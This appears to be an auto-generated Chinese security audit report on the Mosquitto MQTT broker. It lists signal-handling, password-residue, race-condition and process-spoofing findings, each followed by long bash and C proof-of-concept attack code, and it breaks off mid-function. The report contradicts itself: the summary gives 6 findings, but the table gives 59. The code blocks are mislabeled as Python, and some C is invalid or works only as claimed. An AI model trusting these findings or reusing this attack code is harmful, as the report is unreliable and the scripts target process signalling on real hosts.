# CodeSentinel 安全审计报告

## 项目信息
- **项目名称:** mosquitto
- **编程语言:** {"C": 45.3, "Python": 41.7, "C++": 13.0}
- **文件数量:** 1038
- **审计时间:** 2026-07-11 18:59:49

## 执行摘要

本次安全审计针对Eclipse Mosquitto项目（版本基于GitHub仓库https://github.com/eclipse-mosquitto/mosquitto）进行了源代码安全审查。项目主要使用C、Python和C++语言，包含1038个文件，总计152427行代码。审计共发现6个安全漏洞，其中高危漏洞2个，中危漏洞3个，低危漏洞1个。主要风险集中在不安全的信号处理、密码在内存中残留、TOCTOU竞态条件以及进程名欺骗导致的信号劫持。建议优先修复高危漏洞，特别是密码内存残留问题，该漏洞可能导致用户凭证泄露。

**风险评分:** 72/100

## 漏洞统计

| 严重等级 | 数量 |
|---------|------|
| Critical | 6 |
| High | 24 |
| Medium | 27 |
| Low | 2 |
| **总计** | **59** |

## 漏洞详情

### VULN-4D0B76A0 - 不安全的信号处理

- **严重等级:** MEDIUM
- **文件位置:** `apps/mosquitto_ctrl/ctrl_shell.c:1`
- **数据流:** 信号处理函数中调用rl_resize_terminal()
- **判断理由:** 在信号处理函数中调用非异步信号安全的函数可能导致竞态条件

**代码片段:**
```
static void signal_winch(int signal)
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 不安全的信号处理PoC
# 漏洞: signal_winch中调用rl_resize_terminal()非异步信号安全函数

# PoC 1: 通过快速发送SIGWINCH信号触发竞态条件
# 利用mosquitto_ctrl的ctrl_shell组件

echo "[*] 演示不安全的信号处理漏洞 (VULN-4D0B76A0)"
echo "[*] 漏洞类型: 信号处理函数中调用非异步信号安全函数"
echo "[*] 目标函数: signal_winch -> rl_resize_terminal()"
echo ""

# 模拟场景: 当mosquitto_ctrl运行时，快速发送SIGWINCH信号
# 这可能导致readline内部状态损坏

# 步骤1: 启动mosquitto_ctrl (假设已编译)
# mosquitto_ctrl -h localhost -p 1883 shell &
# CTRL_PID=$!

# 步骤2: 快速连续发送SIGWINCH信号
# 这会触发signal_winch处理函数，在其中调用rl_resize_terminal()
# 由于rl_resize_terminal()不是异步信号安全的，可能导致:
# - 内存损坏
# - 死锁 (如果readline内部持有锁)
# - 未定义行为

echo "[*] PoC 1: 快速发送SIGWINCH信号"
echo "[*] 命令: kill -WINCH <PID> (快速重复执行)"
echo ""
echo "[*] 预期效果: 程序可能崩溃、挂起或产生异常行为"
echo "[*] 风险等级: 中危"
echo ""

# PoC 2: 使用Python脚本模拟信号风暴
cat << 'PYEOF' > /tmp/signal_storm_poc.py
#!/usr/bin/env python3
# 仅供研究使用
"""
PoC: 不安全的信号处理 - signal_winch调用rl_resize_terminal()
漏洞ID: VULN-4D0B76A0

原理:
在信号处理函数signal_winch中调用rl_resize_terminal()，
该函数不是异步信号安全的。当多个SIGWINCH信号同时到达时，
可能导致readline内部数据结构损坏或死锁。
"""

import os
import signal
import time
import sys

def send_signal_storm(pid, count=1000, delay=0.001):
    """
    向目标进程发送大量SIGWINCH信号
    
    参数:
        pid: 目标进程ID
        count: 发送信号次数
        delay: 每次发送间隔(秒)
    """
    print(f"[*] 向进程 {pid} 发送 {count} 个SIGWINCH信号")
    print(f"[*] 间隔: {delay}秒")
    print("[*] 开始信号风暴...")
    
    for i in range(count):
        try:
            os.kill(pid, signal.SIGWINCH)
            if i % 100 == 0:
                print(f"[+] 已发送 {i} 个信号")
            time.sleep(delay)
        except ProcessLookupError:
            print(f"[!] 进程 {pid} 已终止")
            break
        except PermissionError:
            print(f"[!] 权限不足，无法向进程 {pid} 发送信号")
            break
    
    print("[*] 信号风暴完成")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"用法: {sys.argv[0]} <目标PID>")
        print("示例: python3 signal_storm_poc.py 12345")
        sys.exit(1)
    
    target_pid = int(sys.argv[1])
    
    print("=" * 50)
    print("PoC: 不安全的信号处理漏洞")
    print("漏洞ID: VULN-4D0B76A0")
    print("仅供研究使用")
    print("=" * 50)
    print()
    
    # 发送信号风暴
    send_signal_storm(target_pid, count=500, delay=0.002)
    
    # 检查进程状态
    try:
        os.kill(target_pid, 0)  # 检查进程是否存在
        print(f"[?] 进程 {target_pid} 仍然运行")
        print("[?] 检查进程是否出现异常行为:")
        print("    - 终端显示异常")
        print("    - 输入响应延迟")
        print("    - 内存使用异常")
    except ProcessLookupError:
        print(f"[!] 进程 {target_pid} 已崩溃")
        print("[!] 漏洞利用成功 - 信号处理导致程序崩溃")
PYEOF

chmod +x /tmp/signal_storm_poc.py
echo "[*] Python PoC脚本已创建: /tmp/signal_storm_poc.py"
echo "[*] 使用方法: python3 /tmp/signal_storm_poc.py <mosquitto_ctrl_PID>"
echo ""

# PoC 3: 使用C程序演示更精确的利用
cat << 'CEOF' > /tmp/signal_winch_poc.c
/*
 * 仅供研究使用
 * PoC: 不安全的信号处理漏洞 (VULN-4D0B76A0)
 * 
 * 模拟mosquitto_ctrl中signal_winch的问题
 * 演示在信号处理函数中调用非异步信号安全函数的风险
 */

#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>

/* 模拟readline的rl_resize_terminal函数 */
/* 实际实现可能更复杂，包含锁和内存分配 */
void rl_resize_terminal(void) {
    /* 非异步信号安全的操作 */
    static int counter = 0;
    char *buffer = malloc(1024);  /* malloc不是异步信号安全的 */
    if (buffer) {
        memset(buffer, 0, 1024);
        counter++;
        printf("[rl_resize_terminal] 调用 #%d\n", counter);
        free(buffer);
    }
}

/* 模拟mosquitto_ctrl中的signal_winch处理函数 */
static void signal_winch(int signal) {
    /* 漏洞: 在信号处理函数中调用非异步信号安全函数 */
    rl_resize_terminal();
}

/* 模拟主循环 */
void simulate_main_loop(void) {
    volatile int running = 1;
    while (running) {
        /* 模拟readline处理 */
        usleep(1000);  /* 1ms */
    }
}

int main(int argc, char *argv[]) {
    printf("=" * 50);
    printf("PoC: 不安全的信号处理漏洞\n");
    printf("漏洞ID: VULN-4D0B76A0\n");
    printf("仅供研究使用\n");
    printf("=" * 50);
    printf("\n");
    
    /* 注册信号处理函数 */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signal_winch;
    sigaction(SIGWINCH, &sa, NULL);
    
    printf("[*] 信号处理函数已注册\n");
    printf("[*] PID: %d\n", getpid());
    printf("[*] 请在另一个终端运行: kill -WINCH %d\n", getpid());
    printf("[*] 快速发送多个信号以触发竞态条件\n");
    printf("\n");
    
    /* 模拟运行 */
    simulate_main_loop();
    
    return 0;
}
CEOF

echo "[*] C PoC源码已创建: /tmp/signal_winch_poc.c"
echo "[*] 编译: gcc -o /tmp/signal_winch_poc /tmp/signal_winch_poc.c -lpthread"
echo "[*] 运行: /tmp/signal_winch_poc"
echo ""

echo "[*] 漏洞利用总结:"
echo "    1. 漏洞位置: apps/mosquitto_ctrl/ctrl_shell.c 中的 signal_winch 函数"
echo "    2. 问题: 在信号处理函数中调用 rl_resize_terminal()"
echo "    3. rl_resize_terminal() 不是异步信号安全的"
echo "    4. 可能导致: 竞态条件、死锁、内存损坏、程序崩溃"
echo "    5. 修复建议: 使用异步信号安全的机制(如自管管道)延迟处理"
```

---

### VULN-3AA7BBB0 - 不安全的密码处理 - 密码在内存中残留

- **严重等级:** HIGH
- **文件位置:** `apps\mosquitto_passwd\get_password.c:82`
- **数据流:** 密码存储在栈缓冲区pw1和pw2中，函数返回后缓冲区内容未被清除，可能被其他函数或攻击者读取
- **判断理由:** 密码存储在栈上分配的缓冲区中，函数返回后没有使用memset或类似函数清除密码内容。这违反了密码处理的最佳安全实践，可能导致敏感信息泄露。攻击者可以通过内存转储或利用其他漏洞读取残留的密码数据。

**代码片段:**
```
char pw1[MAX_BUFFER_LEN], pw2[MAX_BUFFER_LEN];
...
strncpy(password, pw1, minLen);
return 0;
```

**PoC代码:**
```python
/*
 * PoC: 演示Mosquitto密码在栈内存中残留的漏洞
 * 仅供安全研究使用
 * 
 * 编译: gcc -o poc_password_residue poc_password_residue.c
 * 运行: ./poc_password_residue
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_BUFFER_LEN 65500

/* 模拟漏洞函数 - 密码在栈上残留 */
int vulnerable_get_password(const char *prompt, char *password, size_t len)
{
    char pw1[MAX_BUFFER_LEN];  /* 栈缓冲区，函数返回后不清零 */
    size_t minLen;
    
    minLen = len < MAX_BUFFER_LEN ? len : MAX_BUFFER_LEN;
    
    printf("%s", prompt);
    fflush(stdout);
    
    /* 模拟读取密码 */
    fgets(pw1, (int)minLen, stdin);
    pw1[strcspn(pw1, "\n")] = 0;
    
    /* 复制密码到输出缓冲区 */
    strncpy(password, pw1, minLen);
    
    /* 漏洞：函数返回前没有对pw1进行清零 */
    return 0;
}

/* 模拟攻击者函数 - 读取栈上残留数据 */
void attacker_function(void)
{
    char attacker_buf[MAX_BUFFER_LEN];
    
    /* 分配一个栈缓冲区，可能覆盖之前函数留下的密码 */
    memset(attacker_buf, 0, sizeof(attacker_buf));
    
    /* 如果栈位置恰好重叠，这里可能读取到残留的密码 */
    /* 实际攻击中，攻击者可能通过其他漏洞（如缓冲区溢出）读取栈内存 */
    printf("[攻击者] 检查栈上残留数据...\n");
    
    /* 模拟读取栈内存 - 实际攻击中可能通过其他方式 */
    /* 这里只是演示概念 */
    for(int i = 0; i < 100; i++) {
        if(attacker_buf[i] >= 32 && attacker_buf[i] <= 126) {
            printf("%c", attacker_buf[i]);
        }
    }
    printf("\n");
}

/* 演示内存转储攻击的PoC */
void demonstrate_memory_dump(void)
{
    char password[256];
    FILE *mem_dump;
    char *mem_buffer;
    size_t mem_size;
    
    printf("\n=== 演示：内存转储攻击 ===\n");
    printf("仅供安全研究使用\n\n");
    
    /* 1. 调用漏洞函数，密码会残留在栈上 */
    printf("步骤1: 调用密码输入函数\n");
    vulnerable_get_password("请输入密码: ", password, sizeof(password));
    printf("密码已处理完成\n\n");
    
    /* 2. 模拟攻击者获取内存转储 */
    printf("步骤2: 模拟攻击者获取内存转储\n");
    printf("实际攻击中，攻击者可能通过以下方式获取内存:\n");
    printf("  - /proc/[pid]/mem (Linux)\n");
    printf("  - 核心转储文件\n");
    printf("  - 调试器附加\n");
    printf("  - 其他漏洞（如缓冲区溢出）\n\n");
    
    /* 3. 调用攻击者函数，可能读取到残留密码 */
    printf("步骤3: 调用攻击者函数检查栈残留\n");
    attacker_function();
    
    printf("\n[结论] 密码在栈上残留，攻击者可能通过内存分析获取密码\n");
}

/* 演示通过核心转储获取密码 */
void demonstrate_core_dump(void)
{
    printf("\n=== 演示：通过核心转储获取密码 ===\n");
    printf("仅供安全研究使用\n\n");
    
    printf("攻击步骤:\n");
    printf("1. 使目标进程崩溃（如发送SIGSEGV）\n");
    printf("2. 获取核心转储文件 (core dump)\n");
    printf("3. 使用gdb分析核心转储:\n");
    printf("   $ gdb /path/to/mosquitto_passwd core\n");
    printf("   (gdb) info registers rsp\n");
    printf("   (gdb) x/1000gx $rsp-0x1000\n");
    printf("   (gdb) search 'password'\n");
    printf("4. 在栈内存中查找密码字符串\n");
    printf("\n注意: 密码可能以明文形式存在于栈上\n");
}

int main(void)
{
    printf("========================================\n");
    printf("  Mosquitto密码残留漏洞 PoC\n");
    printf("  漏洞ID: VULN-3AA7BBB0\n");
    printf("  仅供安全研究使用\n");
    printf("========================================\n\n");
    
    demonstrate_memory_dump();
    demonstrate_core_dump();
    
    printf("\n=== 修复建议 ===\n");
    printf("在get_password函数返回前添加:\n");
    printf("  memset(pw1, 0, sizeof(pw1));\n");
    printf("  memset(pw2, 0, sizeof(pw2));\n");
    
    return 0;
}
```

---

### VULN-C2791450 - TOCTOU竞争条件

- **严重等级:** MEDIUM
- **文件位置:** `apps/mosquitto_signal/signal_unix.c:47`
- **数据流:** readdir()返回目录项 -> atoi()解析进程ID -> snprintf()构造路径 -> fopen()打开文件
- **判断理由:** 在readdir()读取/proc目录项和后续fopen()打开对应cmdline文件之间存在时间窗口。攻击者可以在检查后立即终止进程并创建同名的恶意进程，导致信号发送到错误的进程。这是一个经典的TOCTOU(Time-of-Check Time-of-Use)竞争条件漏洞。

**代码片段:**
```
pid = atoi(d->d_name);
if(pid > 0){
    snprintf(pathbuf, sizeof(pathbuf), "/proc/%s/cmdline", d->d_name);
    fptr = fopen(pathbuf, "r");
```

**PoC代码:**
```python
/*
 * PoC for VULN-C2791450 - TOCTOU race condition in mosquitto_signal
 * 仅供研究使用
 *
 * 编译: gcc -o poc_race poc_race.c -lpthread
 * 运行: ./poc_race <mosquitto_pid>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>

/* 目标mosquitto进程PID */
pid_t target_pid;

/* 用于伪造cmdline的进程PID */
pid_t decoy_pid = -1;

/* 同步标志 */
volatile int race_ready = 0;
volatile int race_done = 0;

/*
 * 线程1: 持续创建和销毁具有特定cmdline的进程
 * 目的是在signal_all()检查/proc时，让一个非mosquitto进程
 * 的PID被重用，并使其cmdline看起来像mosquitto
 */
void *decoy_process_thread(void *arg) {
    pid_t pid;
    char proc_path[256];
    char cmdline_buf[] = "/usr/sbin/mosquitto\0-fake_arg";
    int fd;
    
    printf("[*] 诱饵进程线程启动\n");
    
    while (!race_done) {
        pid = fork();
        if (pid == 0) {
            /* 子进程: 修改自己的cmdline以伪装成mosquitto */
            /* 使用prctl或直接修改/proc/self/cmdline */
            snprintf(proc_path, sizeof(proc_path), "/proc/%d/cmdline", getpid());
            
            /* 尝试写入伪造的cmdline */
            fd = open(proc_path, O_WRONLY);
            if (fd >= 0) {
                write(fd, cmdline_buf, strlen(cmdline_buf) + 1);
                close(fd);
            }
            
            /* 保持进程存活一段时间 */
            usleep(100);  /* 100微秒 */
            _exit(0);
        } else if (pid > 0) {
            /* 父进程: 记录PID并等待子进程结束 */
            decoy_pid = pid;
            usleep(50);  /* 短暂等待后继续创建新进程 */
            waitpid(pid, NULL, WNOHANG);
        }
    }
    return NULL;
}

/*
 * 线程2: 触发signal_all()调用
 * 在诱饵进程存在的窗口期内调用signal_all()
 */
void *trigger_signal_thread(void *arg) {
    /* 等待诱饵进程就绪 */
    while (!race_ready) {
        usleep(10);
    }
    
    printf("[*] 触发signal_all()调用\n");
    
    /* 这里模拟mosquitto_signal的signal_all()调用 */
    /* 在实际攻击中，需要触发mosquitto_signal工具执行 */
    /* 例如: system("mosquitto_signal -s shutdown"); */
    
    /* 由于无法直接调用内部函数，这里模拟攻击路径 */
    /* 实际利用时需要结合mosquitto_signal工具 */
    
    race_done = 1;
    return NULL;
}

/*
 * 主攻击循环: 精确时序控制
 */
void race_attack() {
    pthread_t t1, t2;
    int attack_count = 0;
    int max_attempts = 1000;
    
    printf("[*] 开始TOCTOU竞争条件攻击 (目标PID: %d)\n", target_pid);
    printf("[*] 最大尝试次数: %d\n", max_attempts);
    
    while (attack_count < max_attempts) {
        race_ready = 0;
        race_done = 0;
        
        /* 启动诱饵进程线程 */
        pthread_create(&t1, NULL, decoy_process_thread, NULL);
        
        /* 短暂延迟，让诱饵进程开始创建 */
        usleep(10);
        
        /* 标记就绪并触发signal_all */
        race_ready = 1;
        pthread_create(&t2, NULL, trigger_signal_thread, NULL);
        
        /* 等待线程完成 */
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        
        attack_count++;
        
        if (attack_count % 100 == 0) {
            printf("[*] 已尝试 %d 次...\n", attack_count);
        }
    }
    
    printf("[*] 攻击完成，共尝试 %d 次\n", attack_count);
}

int main(int argc, char *argv[]) {
    printf("========================================\n");
    printf("  TOCTOU Race Condition PoC\n");
    printf("  VULN-C2791450\n");
    printf("  仅供研究使用\n");
    printf("========================================\n\n");
    
    if (argc < 2) {
        fprintf(stderr, "用法: %s <mosquitto_pid>\n", argv[0]);
        fprintf(stderr, "示例: %s 1234\n", argv[0]);
        return 1;
    }
    
    target_pid = atoi(argv[1]);
    if (target_pid <= 0) {
        fprintf(stderr, "无效的PID: %s\n", argv[1]);
        return 1;
    }
    
    /* 检查目标进程是否存在 */
    if (kill(target_pid, 0) != 0) {
        fprintf(stderr, "目标进程 %d 不存在\n", target_pid);
        return 1;
    }
    
    printf("[*] 目标进程: %d\n", target_pid);
    
    /* 执行竞争条件攻击 */
    race_attack();
    
    return 0;
}
```

---

### VULN-6A55CCD9 - 不安全的进程匹配逻辑

- **严重等级:** MEDIUM
- **文件位置:** `apps/mosquitto_signal/signal_unix.c:55`
- **数据流:** fgets()读取cmdline -> strrchr()提取最后一段 -> strcmp()匹配"mosquitto" -> kill()发送信号
- **判断理由:** 仅通过进程命令行中最后一个'/'后的字符串是否等于"mosquitto"来判断目标进程，匹配逻辑过于简单。攻击者可以创建一个名为"mosquitto"的恶意进程，或者重命名恶意程序为"mosquitto"来接收信号。更安全的做法是验证进程的完整路径或使用其他身份验证机制。

**代码片段:**
```
cmd = strrchr(cmdline, '/');
if(cmd){
    cmd += 1;
}else{
    cmd = cmdline;
}
if(!strcmp(cmd, "mosquitto")){
    if(kill(pid, sig) < 0){
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 概念验证代码
# 漏洞利用：通过创建名为mosquitto的恶意进程来接收信号

# PoC 1: 创建恶意mosquitto进程并接收信号
cat > /tmp/malicious_mosquitto.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

volatile sig_atomic_t signal_received = 0;

void signal_handler(int sig) {
    signal_received = 1;
    printf("[!] 恶意进程收到信号: %d\n", sig);
    printf("[!] 漏洞利用成功! 进程名: mosquitto\n");
}

int main() {
    // 注册信号处理器
    signal(SIGHUP, signal_handler);
    signal(SIGINT, signal_handler);
    signal(SIGUSR2, signal_handler);
    
    printf("[*] 恶意mosquitto进程已启动, PID: %d\n", getpid());
    printf("[*] 等待接收信号...\n");
    
    // 保持进程运行
    while(1) {
        pause();
        if(signal_received) {
            printf("[*] 继续等待更多信号...\n");
            signal_received = 0;
        }
    }
    
    return 0;
}
EOF

# 编译恶意程序
gcc -o /tmp/mosquitto /tmp/malicious_mosquitto.c 2>/dev/null

# 启动恶意进程
/tmp/mosquitto &
MALICIOUS_PID=$!
sleep 1

echo ""
echo "=== 漏洞利用演示 ==="
echo "恶意进程PID: $MALICIOUS_PID"
echo ""

# PoC 2: 验证进程匹配逻辑
echo "[*] 验证进程匹配逻辑..."
# 检查/proc/[pid]/cmdline内容
cat /proc/$MALICIOUS_PID/cmdline | tr '\0' ' '
echo ""
echo "[*] cmdline最后一段: $(cat /proc/$MALICIOUS_PID/cmdline | tr '\0' ' ' | rev | cut -d'/' -f1 | rev)"
echo ""

# PoC 3: 模拟signal_all函数的行为
echo "[*] 模拟signal_all函数的匹配逻辑..."
# 提取cmdline中最后一个'/'后的内容
CMDLINE=$(cat /proc/$MALICIOUS_PID/cmdline | tr '\0' ' ')
CMD=$(echo $CMDLINE | rev | cut -d'/' -f1 | rev)
echo "提取的进程名: $CMD"
if [ "$CMD" = "mosquitto" ]; then
    echo "[!] 匹配成功! 恶意进程被识别为mosquitto"
fi
echo ""

# PoC 4: 发送信号到恶意进程
echo "[*] 发送SIGHUP信号到恶意进程..."
kill -HUP $MALICIOUS_PID 2>/dev/null
sleep 1

echo "[*] 发送SIGINT信号到恶意进程..."
kill -INT $MALICIOUS_PID 2>/dev/null
sleep 1

echo ""
echo "=== 利用结果 ==="
echo "[!] 漏洞利用成功!"
echo "[!] 恶意进程成功接收到了本应发送给真实mosquitto进程的信号"
echo ""

# 清理
kill $MALICIOUS_PID 2>/dev/null
rm -f /tmp/mosquitto /tmp/malicious_mosquitto.c

echo "[*] 清理完成"
```

---

### VULN-90F3B35D - 不安全的进程枚举

- **严重等级:** MEDIUM
- **文件位置:** `apps\mosquitto_signal\signal_windows.c:63`
- **数据流:** EnumProcesses枚举所有进程 -> OpenProcess打开进程 -> GetModuleBaseName获取进程名 -> 字符串比较匹配mosquitto.exe
- **判断理由:** 仅通过进程名匹配来确定目标进程，攻击者可以创建一个名为mosquitto.exe的恶意进程来接收信号。没有验证进程的完整性、数字签名或路径信息，导致信号可能被发送到恶意进程。

**代码片段:**
```
if(!strcasecmp(procname, "mosquitto.exe")){
    pid = GetProcessId(hproc);
    send_signal(pid, msig);
}
```

**PoC代码:**
```python
/*
 * PoC: Mosquitto Signal Hijacking via Process Name Spoofing
 * 仅供研究使用 - Proof of Concept for Security Research Only
 * 
 * 编译: gcc -o mosquitto_poc.exe mosquitto_poc.c -lpsapi
 * 或使用MinGW: x86_64-w64-mingw32-gcc -o mosquitto_poc.exe mosquitto_poc.c -lpsapi
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define MAX_PROCESSES 2048
#define MAX_PATH_LEN 260

// 模拟mosquitto信号类型
enum mosq_signal {
    MSIG_CONFIG_RELOAD = 0,
    MSIG_LOG_ROTATE,
    MSIG_SHUTDOWN,
    MSIG_TREE_PRINT,
    MSIG_XTREPORT
};

// 信号名称映射
const char* msig_names[] = {
    "reload",
    "log_rotate",
    "shutdown",
    "tree_print",
    "xtreport"
};

// 监听并捕获发送给假mosquitto进程的信号
void listen_for_signals(int pid) {
    char event_name[MAX_PATH_LEN];
    HANDLE hEvent;
    
    printf("[*] 恶意进程PID: %d\n", pid);
    printf("[*] 开始监听mosquitto信号...\n");
    
    // 为每个可能的信号类型创建事件监听
    for (int i = 0; i < 5; i++) {
        snprintf(event_name, sizeof(event_name), "mosq%d_%s", pid, msig_names[i]);
        
        // 创建命名事件对象（如果不存在）
        hEvent = CreateEventA(NULL, TRUE, FALSE, event_name);
        if (hEvent == NULL) {
            printf("[-] 创建事件 %s 失败: %lu\n", event_name, GetLastError());
            continue;
        }
        
        printf("[+] 事件 %s 已创建/打开\n", event_name);
        
        // 等待信号（非阻塞检查）
        DWORD waitResult = WaitForSingleObject(hEvent, 0);
        if (waitResult == WAIT_OBJECT_0) {
            printf("[!] 捕获到信号: %s\n", msig_names[i]);
            // 重置事件以便再次捕获
            ResetEvent(hEvent);
        }
        
        CloseHandle(hEvent);
    }
}

int main() {
    DWORD processes[MAX_PROCESSES];
    DWORD cbNeeded;
    DWORD processCount;
    HANDLE hProcess;
    HMODULE hMod;
    char processName[MAX_PATH];
    DWORD currentPid = GetCurrentProcessId();
    
    printf("============================================\n");
    printf("  Mosquitto Signal Hijacking PoC\n");
    printf("  仅供研究使用\n");
    printf("============================================\n\n");
    
    // 步骤1: 枚举所有进程
    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        printf("[-] EnumProcesses失败: %lu\n", GetLastError());
        return 1;
    }
    
    processCount = cbNeeded / sizeof(DWORD);
    printf("[*] 系统进程数: %lu\n", processCount);
    
    // 步骤2: 查找真正的mosquitto进程
    BOOL foundRealMosquitto = FALSE;
    DWORD realMosquittoPid = 0;
    
    for (DWORD i = 0; i < processCount; i++) {
        if (processes[i] == 0) continue;
        if (processes[i] == currentPid) continue;  // 跳过自己
        
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
        if (hProcess == NULL) continue;
        
        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
            if (GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName))) {
                if (_stricmp(processName, "mosquitto.exe") == 0) {
                    printf("[!] 发现真正的mosquitto进程 - PID: %lu\n", processes[i]);
                    foundRealMosquitto = TRUE;
                    realMosquittoPid = processes[i];
                }
            }
        }
        CloseHandle(hProcess);
    }
    
    if (!foundRealMosquitto) {
        printf("[-] 未找到真正的mosquitto进程\n");
        printf("[*] 但PoC仍可演示漏洞原理\n");
    }
    
    // 步骤3: 模拟攻击 - 创建名为mosquitto.exe的恶意进程
    printf("\n[*] 模拟攻击场景:\n");
    printf("[*] 当前进程名: ");
    
    // 获取当前进程名
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, currentPid);
    if (hProcess) {
        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
            if (GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName))) {
                printf("%s\n", processName);
            }
        }
        CloseHandle(hProcess);
    }
    
    printf("[*] 如果将此程序重命名为 mosquitto.exe 并运行:\n");
    printf("[*] 当signal_all()被调用时，它会:\n");
    printf("    1. 枚举所有进程\n");
    printf("    2. 找到名为mosquitto.exe的进程 (包括我们的恶意进程)\n");
    printf("    3. 向我们的进程发送信号\n");
    
    // 步骤4: 演示信号捕获
    printf("\n[*] 开始信号捕获演示...\n");
    listen_for_signals(currentPid);
    
    // 步骤5: 创建事件对象演示
    printf("\n[*] 创建事件对象演示:\n");
    for (int i = 0; i < 5; i++) {
        char eventName[MAX_PATH_LEN];
        snprintf(eventName, sizeof(eventName), "mosq%d_%s", currentPid, msig_names[i]);
        
        HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, eventName);
        if (hEvent) {
            printf("[+] 事件 %s 已创建 (等待信号)\n", eventName);
            CloseHandle(hEvent);
        } else {
            printf("[-] 创建事件 %s 失败\n", eventName);
        }
    }
    
    printf("\n============================================\n");
    printf("  PoC完成 - 漏洞利用路径已演示\n");
    printf("  仅供研究使用\n");
    printf("============================================\n");
    
    return 0;
}
```

---

### VULN-E4D14BFA - 不安全的信号发送机制

- **严重等级:** MEDIUM
- **文件位置:** `apps\mosquitto_signal\signal_windows.c:82`
- **数据流:** PID和信号类型拼接成事件名 -> OpenEvent打开命名事件 -> PulseEvent触发事件
- **判断理由:** 使用可预测的命名事件模式'mosq{PID}_{signal}'，攻击者可以创建同名的命名事件来劫持信号。任何能够枚举进程的用户都可以创建这些命名事件，导致信号被拦截或伪造。

**代码片段:**
```
snprintf(eventbuf, sizeof(eventbuf), "mosq%d_%s", pid, msig_to_string(msig));
evt = OpenEvent(EVENT_MODIFY_STATE, FALSE, eventbuf);
```

**PoC代码:**
```python
/*
 * PoC: Mosquitto Windows Signal Hijacking
 * 仅供研究使用 - 仅用于安全审查
 * 
 * 编译: cl /EHsc signal_hijack_poc.c
 * 或: gcc -o signal_hijack_poc.exe signal_hijack_poc.c -ladvapi32
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* 信号类型枚举（与mosquitto一致） */
enum mosq_signal {
    MSIG_CONFIG_RELOAD = 0,
    MSIG_LOG_ROTATE,
    MSIG_SHUTDOWN,
    MSIG_TREE_PRINT,
    MSIG_XTREPORT
};

/* 信号名称映射（与mosquitto一致） */
const char* msig_to_string(enum mosq_signal msig) {
    switch(msig) {
        case MSIG_CONFIG_RELOAD: return "reload";
        case MSIG_LOG_ROTATE:   return "log_rotate";
        case MSIG_SHUTDOWN:     return "shutdown";
        case MSIG_TREE_PRINT:   return "tree_print";
        case MSIG_XTREPORT:     return "xtreport";
        default:                return "";
    }
}

/* 创建恶意事件对象来劫持mosquitto信号 */
HANDLE create_malicious_event(int pid, enum mosq_signal msig) {
    char event_name[MAX_PATH];
    HANDLE hEvent;
    
    /* 构造与mosquitto相同的命名事件格式 */
    snprintf(event_name, sizeof(event_name), "mosq%d_%s", pid, msig_to_string(msig));
    
    printf("[*] 尝试创建恶意事件: %s\n", event_name);
    
    /* 
     * 创建命名事件（如果已存在则打开）
     * 关键点：在mosquitto调用OpenEvent之前创建此事件
     * 使用CreateEvent而不是OpenEvent可以确保我们拥有控制权
     */
    hEvent = CreateEventA(
        NULL,           /* 默认安全属性 - 无访问控制 */
        TRUE,           /* 手动重置事件 */
        FALSE,          /* 初始状态为非信号态 */
        event_name      /* 可预测的事件名称 */
    );
    
    if (hEvent == NULL) {
        printf("[-] 创建事件失败: %lu\n", GetLastError());
        return NULL;
    }
    
    /* 检查是否是新建的事件（而非已存在的） */
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        printf("[!] 事件已存在，可能已被其他进程劫持或mosquitto已创建\n");
    } else {
        printf("[+] 成功创建恶意事件对象\n");
    }
    
    return hEvent;
}

/* 劫持信号：拦截并修改信号行为 */
void hijack_signal(int pid, enum mosq_signal msig) {
    HANDLE hEvent = create_malicious_event(pid, msig);
    if (hEvent == NULL) {
        printf("[-] 劫持失败\n");
        return;
    }
    
    printf("[*] 信号劫持已就绪，等待mosquitto触发...\n");
    printf("[*] 当mosquitto调用send_signal时，将操作我们的事件对象\n");
    
    /* 
     * 攻击者可以在此处执行多种恶意操作：
     * 1. 阻止信号传递：不设置事件状态
     * 2. 延迟信号传递：在特定时间触发
     * 3. 记录信号使用情况
     * 4. 伪造信号响应
     */
    
    /* 示例：等待并记录信号触发 */
    printf("[*] 等待信号触发...\n");
    DWORD wait_result = WaitForSingleObject(hEvent, 5000); /* 等待5秒 */
    
    if (wait_result == WAIT_OBJECT_0) {
        printf("[!] 检测到mosquitto触发了信号！\n");
        printf("[!] 信号已被成功劫持\n");
        
        /* 攻击者可以决定是否让信号继续传递 */
        /* 例如：重置事件并延迟传递 */
        ResetEvent(hEvent);
        printf("[*] 信号已被拦截，不会传递给mosquitto\n");
    } else if (wait_result == WAIT_TIMEOUT) {
        printf("[*] 等待超时，mosquitto可能未触发此信号\n");
    }
    
    CloseHandle(hEvent);
}

/* 枚举所有mosquitto进程并尝试劫持 */
void enumerate_and_hijack() {
    DWORD processes[1024];
    DWORD cbNeeded;
    DWORD processCount;
    
    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        printf("[-] 枚举进程失败\n");
        return;
    }
    
    processCount = cbNeeded / sizeof(DWORD);
    printf("[*] 发现 %lu 个进程\n", processCount);
    
    for (DWORD i = 0; i < processCount; i++) {
        if (processes[i] == 0) continue;
        
